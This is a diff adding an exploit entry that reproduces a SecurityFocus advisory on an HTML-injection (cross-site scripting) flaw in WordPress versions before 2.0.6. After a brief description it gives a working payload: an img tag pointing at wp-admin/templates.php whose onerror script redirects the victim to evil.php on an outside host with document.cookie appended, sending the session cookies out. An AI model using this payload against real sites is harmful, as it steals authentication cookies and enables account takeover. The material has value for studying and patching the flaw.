@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/21782/info
+
+Wordpress is prone to an HTML-injection scripting vulnerability because the application fails to properly sanitize user-supplied input. 
+
+Attacker-supplied HTML and script code would execute in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user; other attacks are also possible.
+
+Versions prior to 2.0.6 are vulnerable to this issue.
+
+< img src='https://wordpress-site/wp/wp-admin/templates.php?file=< img src=%27%27 onerror="javascript: var s=(document.location.toString().charAt(6)); var url=(%27http:%27%2Bs%2Bs%2B%27michaeldaw.org%27); document.location=url%2Bs%2B%27evil.php?%27%2Bdocument.cookie">' >
